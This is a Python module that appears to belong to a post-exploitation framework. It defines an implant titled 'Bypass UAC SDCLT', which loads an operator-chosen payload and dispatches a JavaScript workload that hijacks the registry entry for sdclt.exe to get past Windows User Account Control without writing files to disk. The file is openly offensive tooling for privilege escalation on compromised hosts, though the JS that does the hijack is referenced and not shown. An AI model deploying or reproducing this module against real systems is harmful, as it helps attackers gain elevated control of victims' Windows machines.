import core.job
import core.implant
import uuid

class SDCLTJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        pass
        #self.shell.print_plain(self.data)

class SDCLTImplant(core.implant.Implant):

    NAME = "Bypass UAC SDCLT"
    DESCRIPTION = "Bypass UAC via registry hijack for sdclt.exe. Drops no files to disk."
    AUTHORS = ["zerosum0x0", "@enigma0x3"]

    def load(self):
        self.options.register("PAYLOAD", "", "run payloads for a list")
        self.options.register("PAYLOAD_DATA", "", "the actual data", hidden=True)

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        self.options.set("PAYLOAD_DATA", payload)

        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/elevate/bypassuac_sdclt.js", self.options)

        self.dispatch(workloads, SDCLTJob)
